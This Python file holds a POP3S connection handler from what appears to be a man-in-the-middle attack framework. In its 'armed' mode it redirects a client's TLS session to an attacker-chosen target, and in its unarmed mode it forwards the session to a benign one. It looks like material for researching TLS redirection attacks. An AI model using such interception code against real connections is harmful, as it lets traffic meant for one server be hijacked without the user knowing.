import socket
import time
from collections import defaultdict

from utils.logging import _info, _error
from utils.tls import forward_tls_handshake_and_data

from utils.tls import read_tls_packet


class POP3SHandler:
    def __init__(self, target_ip, target_port, unarmed_target_ip, unarmed_target_port):
        self.status = defaultdict(int)
        self.target_ip = target_ip
        self.target_port = target_port
        self.unarmed_target_ip = unarmed_target_ip
        self.unarmed_target_port = unarmed_target_port

    def handle_connection(self, addr, client_socket, armed):
        if not armed:
            self._forward_http_traffic(addr, client_socket)
        else:
            self._execute_attack(addr, client_socket)

    def _forward_http_traffic(self, addr, client_socket):
        _info("mitmproxy.atck", f"[{addr.ip}] [RUN] FORWARD HTTP TRAFFIC")
        _info("mitmproxy.atck", f"[{addr.ip}] [RUN] CONNECT TO {self.unarmed_target_ip}{self.unarmed_target_port}")
        target_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        target_socket.connect((self.unarmed_target_ip, self.unarmed_target_port))
        _info("mitmproxy.atck", f"[{addr.ip}] [RUN] CONNECTED TO {self.unarmed_target_ip}{self.unarmed_target_port}")
        forward_tls_handshake_and_data(addr, client_socket, target_socket)

    def _execute_attack(self, addr, client_socket):
        _info("mitmproxy.atck", f"[{addr.ip}] [RUN] Attack Preparation")
        target_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        target_socket.connect((self.target_ip, self.target_port))
        _info("mitmproxy.atck", f"[{addr.ip}] [RUN] Target connected")

        forward_tls_handshake_and_data(addr, client_socket, target_socket)
        client_socket.close()

        _info("mitmproxy.atck", f"[{addr.ip}] [FIN] Attack")
